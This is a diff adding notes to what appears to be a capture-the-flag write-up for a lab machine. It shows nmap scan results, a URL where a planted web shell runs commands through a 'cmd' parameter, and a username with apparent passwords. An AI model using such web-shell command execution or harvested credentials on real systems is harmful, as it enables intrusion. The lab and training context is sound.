@@ -21,6 +21,19 @@ sudo nmap -T4 -p- -sV hackervshacker.thm
 
 we got these open ports
 ```bash
-PORT     STATE SERVICE VERSION
-
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+http://hackervshacker.thm/cvs/shell.pdf.php\
+we can pass command with arg cmd=\
+
+
+http://hackervshacker.thm/cvs/shell.pdf.php?cmd=id
+
+lachlan
+dHY5pzmNYoETv7SUaY
+thisistheway123
+thisistheway123
